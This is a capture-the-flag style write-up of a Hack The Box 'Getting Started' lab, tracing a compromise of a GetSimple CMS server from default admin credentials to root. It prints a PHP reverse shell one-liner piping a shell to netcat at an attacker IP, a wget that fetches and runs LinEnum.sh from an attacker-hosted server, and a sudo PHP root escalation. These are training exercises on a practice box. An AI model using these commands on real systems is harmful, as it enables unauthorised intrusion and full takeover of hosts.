# Getting Started - Easy

**Date Completed:** January 27, 2026  
**Difficulty:** Easy  
**Status:** ✅ COMPLETE  
**Classification:** First Solo Easy Box

---

## Phase 1: Initial Reconnaissance

### Step 1: Connection Verification
```
ping TARGET_IP
```
**Result:** Target confirmed reachable on HTB network

### Step 2: Service Enumeration
```
nmap -sS -sV TARGET_IP
```

**Findings:**

| Port | Service | Version | Status |
|------|---------|---------|--------|
| 22 | SSH | OpenSSH (version details) | Open |
| 80 | HTTP | Apache 2.4.41 (Ubuntu) | Open |

**Key Finding:** Apache 2.4.41 on Ubuntu - web application likely primary attack vector

---

## Phase 2: Web Application Enumeration

### Step 1: Website Reconnaissance
Navigated to `http://TARGET_IP` and examined source code and application interface.

**Discovery:** GetSimple CMS running (version unknown initially)

### Step 2: Common Path Enumeration
Tested common subdirectory paths and discovered:
```
http://TARGET_IP/admin
```

**Finding:** Admin login page for GetSimple CMS

### Step 3: Default Credential Testing
Attempted common default credentials:

**Credentials Tested:**
- admin : admin ✅ **SUCCESS**

**Result:** Successfully authenticated to GetSimple admin panel with default credentials

---

## Phase 3: Admin Panel Enumeration

### Step 1: Dashboard Exploration
Upon login, discovered admin dashboard with 5 tabs:
- Title
- Plugins
- Files
- Themes
- Settings (had exclamation point indicator)

### Step 2: Version Identification
Clicked **Settings** tab and found:
```
GetSimple CMS Version: 3.3.15
```

**Importance:** Version number critical for CVE research and known vulnerabilities

### Step 3: Initial Attack Vector - File Upload
Navigated to **Files** tab looking for file upload functionality.

**Result:** File upload button present but non-functional

### Step 4: Vulnerability Research
Searched for GetSimple 3.3.15 known vulnerabilities and discovered:

**Vulnerability Found:** PHP Code Injection in Theme Files
- If write access obtained to `themes.php` or theme template files
- Can inject arbitrary PHP code directly into theme
- Code will execute when theme is rendered

---

## Phase 4: Remote Code Execution via Theme Injection

### Step 1: Theme Enumeration
Navigated to **Themes** tab and found 2 available themes:
1. Default theme
2. Cardinal theme

### Step 2: Theme Edit Access
Selected **Cardinal** theme and clicked **Edit Theme**

**Discovery:** Full PHP source code of theme file accessible and editable

### Step 3: Reverse Shell Payload Injection
Created PHP reverse shell payload (refined from Nibbles exploitation):

```php
<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKING_IP> <PORT> >/tmp/f"); ?>
```

**Injection Point:** Placed payload at bottom of theme file (after body content, before closing HTML tags)

**Critical Note:** Placement after body and before final HTML closing tag ensures:
- Code executes when theme renders
- Doesn't break HTML structure
- Website continues functioning

### Step 4: Website URL Configuration Issue
After injecting payload, attempted to access site at `http://TARGET_IP` but received 404 errors.

**Problem:** GetSimple was configured with domain name `gettingstarted.htb` instead of IP address

**Solution:** 
1. Navigated back to **Settings** tab
2. Found URL configuration option
3. Changed default URL from `gettingstarted.htb` to `http://TARGET_IP`
4. Saved configuration

### Step 5: Reverse Shell Establishment

**On Attack Machine - Start Listener:**
```bash
nc -lvnp 4444
```

**On Target - Trigger RCE:**
Navigated to `http://TARGET_IP` in browser to load theme and execute injected PHP code

**Result:** Reverse shell connection established on port 4444

### Step 6: Shell Upgrade
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

**Result:** Interactive bash shell obtained as web server user

---

## Phase 5: User-Level Enumeration & Flag Retrieval

### Step 1: Directory Navigation
```bash
cd /home
ls -la
```

**Finding:** Located user home directory

### Step 2: User Flag Capture
```bash
cd /home/[username]
ls -la
cat user.txt
```

**Result:** First flag captured ✅

---

## Phase 6: Privilege Escalation

### Step 1: Initial PrivEsc Enumeration Attempt
Attempted to download LinEnum.sh directly from home directory:
```bash
wget http://<ATTACK_IP>:8080/LinEnum.sh
```

**Issue:** User home directory lacks write privileges - file transfer fails

### Step 2: Writable Directory Discovery & /tmp Strategy
Navigated to `/tmp` directory which typically allows write access:
```bash
cd /tmp
```

**Verified:** `/tmp` directory writable by current user

**Why /tmp Instead of User Home?**

Understanding file system permissions is critical for privilege escalation enumeration:

**User Home Directory (/home/username/):**
- Permissions: `drwx------` or `drwxr-xr-x` (restrictive)
- Owner: User who owns that home directory
- Write Access: Only the owning user can write
- Current User Status: May not have write permissions if running as www-data, apache, or other service user
- **Result:** File download fails due to permission denied

**/tmp Directory (Temporary Files):**
- Permissions: `drwxrwxrwt` (world-writable sticky bit)
- Purpose: Temporary storage accessible to all users
- Write Access: **All users can write** (universal write capability)
- Sticky Bit (`t`): Prevents users from deleting other users' files, but allows write
- **Result:** Any user can download and execute files here

**Permission Breakdown:**
```
drwxrwxrwt
│││││││││
│││││││└─ Others can write (w)
│││││││
││││└──── Sticky bit set (t = restricted deletion)
│││
└──────── Owner, Group, Others all have read+write+execute
```

**Lesson:** When initial file transfer fails to home directory, always pivot to `/tmp` or other world-writable directories. This is a fundamental privilege escalation technique.

### Step 3: LinEnum.sh Download to Writable Location
**On Attack Machine - Start HTTP Server:**
```bash
sudo python3 -m http.server 8080
```

**On Target Machine - Download to /tmp:**
```bash
cd /tmp
wget http://<ATTACK_IP>:8080/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh
```

### Step 4: Privilege Escalation Vector Identified
**LinEnum.sh Output - Critical Finding:**
```
Possible sudo pwnage!
/usr/bin/php
```

**Discovery:** `/usr/bin/php` can be executed with sudo without password requirement

### Step 5: Root Access via Sudo PHP
Executed PHP with sudo to gain root shell:
```bash
sudo /usr/bin/php -r 'system("/bin/bash");'
```

**Result:** Root shell obtained - full system access achieved

### Step 6: Root Flag Retrieval
```bash
cat /root/root.txt
```

**Result:** Second flag captured ✅ - BOX PWNED

---

## Exploitation Chain Summary

1. **Reconnaissance** → Apache 2.4.41 on port 80, SSH on port 22
2. **Web Enumeration** → Found `/admin` path with GetSimple CMS
3. **Credential Discovery** → Default credentials `admin:admin` still active
4. **Admin Access** → Identified GetSimple version 3.3.15 in Settings
5. **Vulnerability Research** → Found theme injection vulnerability
6. **RCE Exploitation** → Injected PHP payload into Cardinal theme
7. **Configuration Fix** → Changed GetSimple URL from domain to IP
8. **User Access** → Established reverse shell as web server user
9. **User Flag** → Retrieved `user.txt` from home directory
10. **PrivEsc Enumeration** → Downloaded LinEnum.sh to `/tmp` (writable directory)
11. **PrivEsc Vector** → Identified sudo-executable `/usr/bin/php`
12. **Root Access** → Executed PHP with sudo to gain root shell
13. **Root Flag** → Retrieved `root.txt` - Complete

---

## Key Techniques & Tools

| Technique | Tool/Command | Purpose |
|-----------|--------------|---------|
| Connection Testing | ping | Verify target reachability |
| Service Detection | nmap -sS -sV | Identify open ports and services |
| Web Enumeration | Browser + curl | Discover application and endpoints |
| Default Credentials | Manual testing | Exploit weak authentication |
| Source Code Analysis | Browser inspector | Find application details |
| Vulnerability Research | Manual search | Identify CVEs for known software |
| Code Injection | Theme editor | Execute arbitrary PHP code |
| Reverse Shell | netcat + bash | Interactive shell access |
| Shell Upgrade | python3 pty | Improve shell usability |
| Privilege Escalation | LinEnum.sh | Automated enumeration for privesc vectors |
| Sudo Abuse | sudo command | Execute privileged binaries |

---

## Critical Lessons Learned

### Exploitation Techniques
1. **CMS Vulnerabilities** - Content Management Systems often have template/theme injection vulnerabilities
2. **Default Credentials** - Always test default credentials first (admin:admin, admin:password, etc.)
3. **Settings Enumeration** - Admin settings often contain version information and configuration details
4. **Code Injection Placement** - When injecting code into files, place strategically to avoid breaking functionality
5. **Configuration Discovery** - Web applications may use domain names instead of IPs - check configuration options

### Operational Lessons
1. **Write Permissions Matter** - If file download fails, check directory permissions and pivot to writable directories like `/tmp`
2. **Exploit Script Placement** - Always download privilege escalation tools to writable directories (`/tmp`, `/var/tmp`)
3. **Tool Methodology** - LinEnum.sh highlights potential privilege escalation vectors with clear flags
4. **Sudo Misconfiguration** - Binaries executable with sudo without password are critical privesc paths
5. **File Transfer Verification** - Always verify downloaded files are executable before running

### Personal Growth
- **First Solo Box** - Successfully completed without guided walkthroughs
- **Troubleshooting** - Identified and resolved GetSimple URL configuration issue independently
- **Adaptability** - When file upload failed, pivoted to vulnerability research instead of persisting
- **Problem Solving** - When initial PrivEsc approach failed (permissions), found alternative writable directory
- **Confidence Building** - Reused PHP payload from previous box and applied to new attack surface

---

## Comparison to Nibbles

| Aspect | Getting Started | Nibbles |
|--------|-----------------|---------|
| CMS | GetSimple 3.3.15 | Nibbleblog 4.0.3 |
| RCE Vector | Theme PHP injection | Plugin file upload |
| Default Creds | admin:admin | admin:nibbles |
| PrivEsc Tool | LinEnum.sh | LinEnum.sh |
| PrivEsc Vector | Sudo /usr/bin/php | Sudo monitor.sh |
| Difficulty | Solo completion | Guided completion |
| Key Difference | URL configuration issue | Script appending requirement |

---

## Time Analysis

This was completed faster than Nibbles due to:
- Familiarity with reverse shell payloads
- Knowledge of LinEnum.sh methodology
- Understanding of privilege escalation patterns
- Faster decision-making on pivot points

---

## Status

✅ **BOX PWNED**
- User flag: Retrieved ✓
- Root flag: Retrieved ✓
- First solo Easy box completion ✓
- Vulnerability exploitation successful ✓

**Key Achievement:** Successfully completed first solo Easy box with independent troubleshooting and problem-solving!
